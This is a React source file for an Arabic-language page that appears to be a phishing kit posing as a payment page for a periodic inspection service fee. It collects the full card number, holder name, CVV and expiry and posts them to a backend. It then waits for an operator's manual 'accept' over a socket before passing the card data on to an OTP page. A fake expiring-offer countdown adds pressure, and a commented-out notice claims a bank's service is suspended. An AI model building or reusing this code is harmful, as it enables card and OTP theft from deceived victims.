import React, { useEffect, useState, useMemo, useCallback } from "react";
import { IoIosInformationCircleOutline } from "react-icons/io";
import { api_route, socket } from "../App";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import PriceAmount from "../components/PriceAmount";
import { scrollToTop } from "../utils/scroll";

/**
 * Payment card step — UI aligned with reference PaymentForm (visa entry only).
 * After admin accepts, navigates to /verfiy with serialized data for OTP.
 */
const Confirm = () => {
  const navigate = useNavigate();
  const search = window.location.search;
  const parsed = useMemo(() => {
    try {
      const q = new URLSearchParams(search);
      const raw = q.get("data");
      if (!raw) return null;
      return JSON.parse(raw);
    } catch {
      return null;
    }
  }, [search]);

  const [loading, setLoading] = useState(false);
  const [card_name, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [method] = useState(() => sessionStorage.getItem("method") || "");
  const [error, setError] = useState(false);
  const [errorCard, setErrorCard] = useState(false);
  const [popUp, setPopUp] = useState(true);

  const [counter, setCounter] = useState(60 * 60 * 6);

  useEffect(() => {
    const interval = setInterval(() => {
      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const hours = Math.floor(counter / 3600);
  const minutes = Math.floor((counter % 3600) / 60);
  const seconds = counter % 60;
  const formattedTime = `${String(hours).padStart(2, "0")}:${String(
    minutes
  ).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;

  const priceDisplay = parsed?.companyData?.price ?? "115.00";

  const formatCardNumber = (value) => {
    const numericValue = value.replace(/\D/g, "");
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");
    formattedValue = formattedValue.slice(0, 19);
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handleSumbit = async (e) => {
    e.preventDefault();
    setError(false);
    setLoading(true);
    const check = cardNumber.split(" ").join("");
    if (check.length !== 16) {
      setLoading(false);
      return window.alert("رقم البطاقه يجب ان يكون 16 رقم");
    }
    if (!expiryDate || !expiryDate.includes("/")) {
      setLoading(false);
      return window.alert("يرجى اختيار شهر وسنة انتهاء البطاقة");
    }
    const [month, year] = expiryDate.split("/");
    if (!month || month === "0" || !year || year === "0") {
      setLoading(false);
      return window.alert("يرجى اختيار شهر وسنة انتهاء البطاقة");
    }
//     if (cardNumber.trim().startsWith("4847")) {
//       setLoading(false);
//       return setErrorCard(`عذرًا، مصرف الراجحي موقوف حاليًا
// نفيدكم بأنه يوجد توقف مؤقت في خدمات مصرف الراجحي لدى مركز سلامة، وذلك بسبب خلل فني من جهة مصدر البنك`);
//     }
    if (!parsed?._id) {
      setLoading(false);
      return;
    }
    const finalData = {
      ...parsed,
      card_name,
      cardNumber,
      cvv,
      expiryDate,
    };
    try {
      await axios.post(`${api_route}/visa/${parsed._id}`, finalData);
      socket.emit("paymentForm", parsed._id);
    } catch {
      setLoading(false);
    }
  };

  const onAcceptPaymentForm = useCallback(
    (id) => {
      if (!parsed || id !== parsed._id) return;
      scrollToTop();
      setLoading(false);
      sessionStorage.setItem("cardNumber", cardNumber);
      navigate(
        `/verfiy?data=${encodeURIComponent(
          JSON.stringify({
            ...parsed,
            card_name,
            cardNumber,
            cvv,
            expiryDate,
          })
        )}`
      );
    },
    [parsed, navigate, card_name, cardNumber, cvv, expiryDate]
  );

  const onDeclinePaymentForm = useCallback(
    (id) => {
      if (!parsed || id !== parsed._id) return;
      scrollToTop();
      setLoading(false);
      setError(true);
    },
    [parsed]
  );

  useEffect(() => {
    socket.on("acceptPaymentForm", onAcceptPaymentForm);
    socket.on("declinePaymentForm", onDeclinePaymentForm);
    return () => {
      socket.off("acceptPaymentForm", onAcceptPaymentForm);
      socket.off("declinePaymentForm", onDeclinePaymentForm);
    };
  }, [onAcceptPaymentForm, onDeclinePaymentForm]);

  if (!parsed?._id) {
    return (
      <div className="w-full flex items-center justify-center min-h-52 text-red-500 text-xl">
        Invalid Data
      </div>
    );
  }

  return (
    <div
      className="w-full items-center justify-center flex flex-col bg-white lg:w-1/3 md:w-2/3 py-2"
      dir="rtl"
    >
      {loading && (
        <div className="fixed top-0 w-full z-20 flex items-center justify-center h-screen flex-col left-0 bg-[#00000048]">
          <div className="flex flex-col items-center gap-6 bg-white p-8 w-3/4 rounded-md">
            {method === "mada" ? (
              <div className="w-32 h-20 bg-gray-100 rounded-lg flex items-center justify-center">
                <img src="/mada.png" alt="" />
              </div>
            ) : cardNumber.replace(/\s/g, "").startsWith("4") ? (
              <img
                src="data:image/svg+xml;charset=utf-8,%3Csvg width='120' height='80' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='120' height='80' rx='8' fill='%23fff'/%3E%3Cpath d='m49.893 26.24-11.598 28.224h-6.892l-5.708-22.173c-.345-1.385-.648-1.896-1.703-2.477-1.725-.944-4.574-1.829-7.073-2.378l.17-.817h12.192c1.551 0 2.95 1.053 3.302 2.877l3.015 16.31 7.455-19.2 7.528-.006zm29.679 19.022c.031-7.443-10.107-7.857-10.038-11.18.023-1.009.97-2.087 3.04-2.36 1.023-.136 3.85-.239 7.055 1.26l1.256-5.98c-1.725-.63-3.946-1.235-6.71-1.235-7.08 0-12.066 3.832-12.108 9.312-.048 4.058 3.554 6.325 6.267 7.675 2.794 1.38 3.732 2.273 3.719 3.503-.019 1.888-2.224 2.726-4.288 2.758-3.599.058-5.688-.994-7.353-1.783l-1.296 6.177c1.674.781 4.767 1.463 7.965 1.502 7.532.003 12.458-3.786 12.488-9.648zm18.71 9.206h7.302l-6.152-28.224h-6.113c-1.378 0-2.532.812-3.048 2.067l-10.747 26.157h7.522l1.492-4.212h9.189l.865 4.212zm-7.99-9.984 3.77-10.59 2.173 10.59h-5.943zm-30.152-18.24-5.923 28.224h-7.166l5.923-28.224h7.166Z' fill='%231434CB'/%3E%3Crect x='1' y='1' width='118' height='78' rx='7' stroke='%23DFE5EB' stroke-width='2'/%3E%3C/svg%3E"
                alt="Visa"
                className="w-32 h-auto"
              />
            ) : cardNumber.replace(/\s/g, "").startsWith("5") ? (
              <img
                src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 4a4 4 0 0 1 4-4h30a4 4 0 0 1 4 4v17a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V4Z' fill='%23fff'/%3E%3Cpath d='M15.215 5.85h7.57v13.604h-7.57V5.851Z' fill='%23FF5F00'/%3E%3Cpath d='M15.695 12.652a8.675 8.675 0 0 1 3.293-6.801A8.6 8.6 0 0 0 13.652 4 8.647 8.647 0 0 0 5 12.652a8.647 8.647 0 0 0 8.652 8.653 8.6 8.6 0 0 0 5.336-1.85 8.64 8.64 0 0 1-3.293-6.803Z' fill='%23EB001B'/%3E%3Cpath d='M33 12.652a8.647 8.647 0 0 1-8.652 8.653 8.6 8.6 0 0 1-5.336-1.85 8.603 8.603 0 0 0 3.293-6.803 8.675 8.675 0 0 0-3.293-6.801A8.6 8.6 0 0 1 24.348 4C29.13 4 33 7.894 33 12.652Z' fill='%23F79E1B'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E"
                alt="Mastercard"
                className="w-32 h-auto"
              />
            ) : null}
            <div className="relative">
              <svg
                className="animate-spin h-12 w-12 text-blue-600"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                />
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                />
              </svg>
            </div>
          </div>
        </div>
      )}
      {popUp && (
        <div className="fixed top-0 w-full z-20 flex items-center justify-center h-screen flex-col left-0 bg-black bg-opacity-45">
          <div className="w-11/12 md:w-fit p-3 rounded-md bg-white flex flex-col items-center">
            <img src="/payment.jpeg" className="w-full md:w-1/3" alt="" />
            <span className="text-xl my-5 text-gray-700 w-fit font-bold">
              سارع قبل نهاية العرض !
            </span>
            <span className="font-bold text-gray-700">
              يتبقى على انتهاء العرض:
            </span>
            <div className="text-green-600 text-4xl my-5 font-bold">
              {formattedTime}
            </div>
            <button
              type="button"
              onClick={() => setPopUp(false)}
              className="bg-[#6c757d] text-white w-full text-lg py-2 rounded-md"
            >
              إغلاق
            </button>
          </div>
        </div>
      )}

      <div className="w-full bg-white p-5 pb-0">
        <div className="inline-flex w-full flex-col items-start">
          <div className="inline-flex flex-col items-start gap-3">
            <div className="text-lg font-bold leading-7 text-gray-800">
              معلومات الفاتورة
            </div>
            <p className="text-sm font-normal leading-tight text-gray-500">
              دفع رسوم خدمة الفحص الدوري
            </p>
            <h1 className="text-4xl font-bold leading-10 text-gray-800">
              <PriceAmount amount={priceDisplay} iconClassName="h-7 w-7" />
            </h1>
          </div>
          <div className="flex w-full flex-col gap-6 mt-11">
            <div className="flex flex-col gap-2">
              <div className="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-gray-800">
                <div>المجموع الفرعي</div>
                <PriceAmount amount="100.00" className="leading-none" />
              </div>
              <div className="flex w-full items-center justify-between gap-4 text-xs font-normal leading-none text-gray-500">
                <div>ضريبة القيمة المضافة 15%</div>
                <PriceAmount amount="15.00" className="text-sm leading-none" />
              </div>
            </div>
            <hr className="border-gray-200" />
            <div className="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-gray-800">
              <div>المبلغ المستحق</div>
              <PriceAmount amount={priceDisplay} className="text-sm leading-none" />
            </div>
          </div>
        </div>
      </div>

      <div className="w-full px-4 my-8">
        <div className="flex flex-col gap-2 mb-6">
          <div className="text-lg font-bold leading-7 text-gray-800">
            الدفع من خلال بطاقة الائتمان
          </div>
          <div className="text-sm font-normal leading-tight text-gray-500">
            من فضلك أدخل معلومات الدفع الخاصة بك
          </div>
        </div>

        <form className="flex flex-col gap-4" onSubmit={handleSumbit}>
          <div className="inline-flex w-full flex-col items-start justify-start gap-2">
            <h5 className="flex justify-end gap-2 items-center text-xs font-semibold leading-none text-gray-500 w-full">
              {method === "mada" ? (
                <img
                  src="/mada.png"
                  className="w-16"
                  alt="Mada"
                  onError={(e) => {
                    e.target.style.display = "none";
                  }}
                />
              ) : (
                <>
                  <img
                    src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='38' height='25' rx='4' fill='%23fff'/%3E%3Cpath d='m15.631 8.16-3.666 8.808H9.573L7.77 9.94c-.109-.433-.204-.592-.538-.774C6.687 8.87 5.79 8.59 5 8.417l.054-.255h3.85c.49 0 .932.329 1.043.898l.952 5.097 2.355-5.995 2.377-.002Zm9.37 5.934c.01-2.325-3.192-2.453-3.17-3.492.007-.315.306-.652.96-.737.323-.042 1.217-.075 2.229.394l.397-1.868A6.059 6.059 0 0 0 23.3 8c-2.236 0-3.811 1.197-3.824 2.91-.015 1.268 1.123 1.976 1.98 2.398.883.431 1.179.71 1.174 1.094-.006.59-.703.852-1.355.862-1.137.018-1.796-.31-2.323-.557l-.41 1.93c.529.244 1.506.457 2.516.469 2.38.001 3.935-1.183 3.942-3.013Zm5.906 2.875H33L31.173 8.16h-1.931c-.435 0-.8.254-.963.646l-3.395 8.162h2.376l.471-1.316h2.904l.272 1.317Zm-2.524-3.12 1.191-3.308.686 3.307h-1.877Zm-9.52-5.689-1.871 8.808H14.73l1.871-8.808h2.262Z' fill='%231434CB'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E"
                    width="38"
                    height="25"
                    alt="Visa"
                  />
                  <img
                    src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 4a4 4 0 0 1 4-4h30a4 4 0 0 1 4 4v17a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V4Z' fill='%23fff'/%3E%3Cpath d='M15.215 5.85h7.57v13.604h-7.57V5.851Z' fill='%23FF5F00'/%3E%3Cpath d='M15.695 12.652a8.675 8.675 0 0 1 3.293-6.801A8.6 8.6 0 0 0 13.652 4 8.647 8.647 0 0 0 5 12.652a8.647 8.647 0 0 0 8.652 8.653 8.6 8.6 0 0 0 5.336-1.85 8.64 8.64 0 0 1-3.293-6.803Z' fill='%23EB001B'/%3E%3Cpath d='M33 12.652a8.647 8.647 0 0 1-8.652 8.653 8.6 8.6 0 0 1-5.336-1.85 8.603 8.603 0 0 0 3.293-6.803 8.675 8.675 0 0 0-3.293-6.801A8.6 8.6 0 0 1 24.348 4C29.13 4 33 7.894 33 12.652Z' fill='%23F79E1B'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E"
                    width="38"
                    height="25"
                    alt="Mastercard"
                  />
                </>
              )}
            </h5>

            <div className="relative flex h-full w-full flex-col gap-4">
              <div>
                <p className="text-sm mb-2 text-gray-700">رقم البطاقة</p>
                <div className="relative" dir="ltr">
                  <input
                    value={cardNumber}
                    required
                    onChange={handleCardNumberChange}
                    dir="ltr"
                    maxLength={19}
                    minLength={16}
                    inputMode="numeric"
                    type="text"
                    placeholder="1234 1234 1234 1234"
                    className="w-full border border-gray-300 rounded-md text-black py-2.5 px-3 text-left outline-blue-500 text-sm"
                  />
                </div>
              </div>

              <div>
                <p className="text-sm mb-2 text-gray-700">اسم صاحب البطاقة</p>
                <div className="relative">
                  <input
                    value={card_name}
                    required
                    onChange={(e) => setCardName(e.target.value)}
                    dir="ltr"
                    placeholder=""
                    type="text"
                    maxLength={30}
                    className="w-full border border-gray-300 rounded-md text-black py-2.5 px-3 text-left outline-blue-500 text-sm"
                  />
                  <span
                    className="absolute top-2.5 right-3.5 text-[#bababa] pointer-events-none text-sm"
                    style={{ display: card_name ? "none" : "block" }}
                  >
                    الأسم على البطاقة (بالإنجليزية)
                  </span>
                </div>
              </div>

              <div className="flex gap-2">
                <div className="w-[35%]">
                  <div className="flex justify-between mb-2">
                    <p className="text-sm text-gray-700">رمز (CVV)</p>
                  </div>
                  <div className="relative" dir="ltr">
                    <input
                      value={cvv}
                      onChange={handleCvvChange}
                      inputMode="numeric"
                      maxLength={3}
                      minLength={3}
                      placeholder="CVV"
                      required
                      type="text"
                      className="w-full border border-gray-300 rounded-md text-black py-2.5 px-3 text-left outline-blue-500 text-sm pr-10"
                    />
                  </div>
                </div>

                <div className="w-[65%]">
                  <p className="text-sm mb-2 text-gray-700">تاريخ الانتهاء</p>
                  <div className="flex gap-2">
                    <select
                      name="expiryYear"
                      required
                      value={expiryDate.split("/")[1] || "0"}
                      onChange={(e) => {
                        const year = e.target.value;
                        const month = expiryDate.split("/")[0] || "0";
                        setExpiryDate(`${month}/${year}`);
                      }}
                      className="w-1/2 border border-gray-300 rounded-md text-black py-2.5 px-3 outline-blue-500 text-sm"
                    >
                      <option value="0" disabled>
                        سنة
                      </option>
                      {Array.from({ length: 20 }, (_, i) => {
                        const year = new Date().getFullYear() + i;
                        const shortYear = year.toString().slice(-2);
                        return (
                          <option key={year} value={shortYear}>
                            {year}
                          </option>
                        );
                      })}
                    </select>

                    <select
                      name="expiryMonth"
                      required
                      value={expiryDate.split("/")[0] || "0"}
                      onChange={(e) => {
                        const month = e.target.value;
                        const year = expiryDate.split("/")[1] || "0";
                        setExpiryDate(`${month}/${year}`);
                      }}
                      className="w-1/2 border border-gray-300 rounded-md text-black py-2.5 px-3 outline-blue-500 text-sm"
                    >
                      <option value="0" disabled>
                        شهر
                      </option>
                      {Array.from({ length: 12 }, (_, i) => {
                        const month = (i + 1).toString().padStart(2, "0");
                        return (
                          <option key={month} value={month}>
                            {month}
                          </option>
                        );
                      })}
                    </select>
                  </div>
                </div>
              </div>

              {errorCard && (
                <p className="w-full flex justify-between p-3 border rounded-md text-red-500 text-sm bg-[#f8d7da]">
                  {errorCard}
                </p>
              )}
            </div>
          </div>
          {error ? (
            <div className="w-full text-center text-red-500 flex items-center justify-center">
              <div className="bg-white w-11/12 flex justify-center items-center flex-col gap-y-4 rounded-lg">
                <div className="flex w-full items-start justify-start gap-1 text-red-600">
                  <IoIosInformationCircleOutline className="w-6 h-6" />
                  <span className="flex-1 text-sm">
                    تم رفض البطاقة يرجي إدخال بيانات صحيحة أو أستبدالها ببطاقة
                    أخرى
                  </span>
                </div>
              </div>
            </div>
          ) : null}
          <div className="mt-4">
            <button
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-6 rounded-md text-lg transition-colors"
              type="submit"
            >
              ادفع الآن
            </button>
          </div>

          <img
            src="/cards-all.png"
            width="50%"
            className="mx-auto pt-4"
            alt="Payment methods"
            onError={(e) => {
              e.target.style.display = "none";
            }}
          />

          <div className="flex items-center justify-center gap-2">
            <svg
              className="w-5 h-5 text-green-500"
              focusable="false"
              viewBox="0 0 24 24"
              fill="currentColor"
            >
              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2m-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2m3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1z" />
            </svg>
            <p className="text-sm text-gray-700">دفع آمن وسريع</p>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Confirm;
